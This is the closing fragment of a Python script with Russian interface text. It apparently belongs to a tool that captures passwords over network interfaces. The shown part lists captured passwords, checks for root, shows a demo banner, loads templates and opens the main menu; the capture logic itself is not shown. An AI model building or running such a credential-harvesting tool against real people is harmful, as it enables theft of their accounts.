        for i, pwd_line in enumerate(captured_passwords[:10], 1):
            print(f"  {Colors.WHITE}[{i}] {pwd_line}{Colors.RESET}")
        if len(captured_passwords) > 10:
            print(f"  {Colors.DIM}... and {len(captured_passwords) - 10} more{Colors.RESET}\n")
    
    print(f"{Colors.gradient('='*80, style='claude')}\n")
    
    input(f"{Colors.WHITE}Нажмите Enter для возврата в главное меню...{Colors.RESET}")

if __name__ == '__main__':
    # ПЕРВЫМ ДЕЛОМ - проверка прав root (только не в demo режиме)
    if not DEMO_MODE and os.geteuid() != 0:
        print(f"\n{Colors.gradient('='*60, style='claude')}")
        print(f"{Colors.ORANGE}[!] ОШИБКА: Требуются права root!{Colors.RESET}")
        print(f"{Colors.gradient('='*60, style='claude')}\n")
        print(f"{Colors.WHITE}Этот скрипт должен быть запущен с правами суперпользователя.{Colors.RESET}")
        print(f"{Colors.WHITE}Для работы с сетевыми интерфейсами необходим root доступ.{Colors.RESET}\n")
        print(f"{Colors.ORANGE}Запустите скрипт командой:{Colors.RESET}")
        print(f"{Colors.WHITE}  sudo python3 {sys.argv[0]}{Colors.RESET}\n")
        print(f"{Colors.DIM}Или запустите в демо-режиме:{Colors.RESET}")
        print(f"{Colors.WHITE}  python3 {sys.argv[0]} --demo{Colors.RESET}\n")
        sys.exit(1)
    
    try:
        # Демо режим баннер
        if DEMO_MODE:
            os.system('clear')
            demo_banner = """
══════════════════════════════════════════════════════════════
                                                               
                       DEMO MODE                         
                                                               
            All operations are virtual!                         
            For testing design and interface                 
                                                               
══════════════════════════════════════════════════════════════
            """
            print(Colors.gradient(demo_banner, style='claude'))
            time.sleep(2)
        
        # Инициализация шаблонов
        TemplateManager.init_templates()
        
        # Проверка и установка зависимостей (только не в demo режиме)
        if not DEMO_MODE:
            PackageManager.install_packages()
        
        # Запуск главного меню
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.ORANGE}[*] Программа прервана{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.ORANGE}[!] Ошибка: {e}{Colors.RESET}")
        sys.exit(1)